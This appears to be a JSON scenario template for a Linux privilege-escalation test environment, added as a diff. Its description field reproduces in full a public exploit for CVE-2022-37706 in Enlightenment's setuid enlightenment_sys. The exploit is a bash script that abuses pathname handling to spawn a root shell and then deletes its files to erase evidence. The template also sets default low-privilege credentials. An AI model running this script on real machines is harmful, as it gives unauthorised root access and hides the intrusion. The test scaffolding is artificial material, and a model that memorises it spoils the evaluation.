@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_51180",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Enlightenment v0.25.3 - Privilege escalation (CVE-2022-37706)\n\nExploit source code (51180.txt):\n```\n## Exploit Title: Enlightenment v0.25.3 - Privilege escalation\n## Author: nu11secur1ty\n## Date: 12.26.2022\n## Vendor: https://www.enlightenment.org/\n## Software: https://www.enlightenment.org/download\n## Reference: https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706\n## CVE ID: CVE-2022-37706\n## Description:\nThe Enlightenment Version: 0.25.3 is vulnerable to local privilege escalation.\nEnlightenment_sys in Enlightenment before 0.25.3 allows local users to\ngain privileges because it is setuid root,\nand the system library function mishandles pathnames that begin with a\n/dev/.. substring\nIf the attacker has access locally to some machine on which the\nmachine is installed Enlightenment\nhe can use this vulnerability to do very dangerous stuff.\n\n## STATUS: CRITICAL Vulnerability\n\n## Tested on:\n```bash\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=22.10\nDISTRIB_CODENAME=kinetic\nDISTRIB_DESCRIPTION=\"Ubuntu 22.10\"\nPRETTY_NAME=\"Ubuntu 22.10\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.10\"\nVERSION=\"22.10 (Kinetic Kudu)\"\nVERSION_CODENAME=kinetic\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nUBUNTU_CODENAME=kinetic\nLOGO=ubuntu-logo\n```\n\n[+] Exploit:\n\n```bash\n#!/usr/bin/bash\n# Idea by MaherAzzouz\n# Development by nu11secur1ty\n\necho \"CVE-2022-37706\"\necho \"[*] Trying to find the vulnerable SUID file...\"\necho \"[*] This may take few seconds...\"\n\n# The actual problem\nfile=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)\nif [[ -z ${file} ]]\nthen\n\techo \"[-] Couldn't find the vulnerable SUID file...\"\n\techo \"[*] Enlightenment should be installed on your system.\"\n\texit 1\nfi\n\necho \"[+] Vulnerable SUID binary found!\"\necho \"[+] Trying to pop a root shell!\"\nmkdir -p /tmp/net\nmkdir -p \"/dev/../tmp/;/tmp/exploit\"\n\necho \"/bin/sh\" > /tmp/exploit\nchmod a+x /tmp/exploit\necho \"[+] Welcome to the rabbit hole :)\"\n\n${file} /bin/mount -o\nnoexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u),\n\"/dev/../tmp/;/tmp/exploit\" /tmp///net\n\nread -p \"Press any key to clean the evedence...\"\necho -e \"Please wait... \"\n\nsleep 5\nrm -rf /tmp/exploit\nrm -rf /tmp/net\necho -e \"Done; Everything is clear ;)\"\n\n```\n\n## Reproduce:\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706)\n## Proof and Exploit:\n[href](https://streamable.com/zflbgg)\n\n## Time spent\n`01:00:00`\n\n\n--\nSystem Administrator - Infrastructure Engineer\nPenetration Testing Engineer\nExploit developer at https://packetstormsecurity.com/\nhttps://cve.mitre.org/index.html and https://www.exploit-db.com/\nhome page: https://www.nu11secur1ty.com/\nhiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=\n                          nu11secur1ty <http://nu11secur1ty.com/>\n```",
+  "cve": "CVE-2022-37706",
+  "exploitdb_id": "51180",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_51180",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
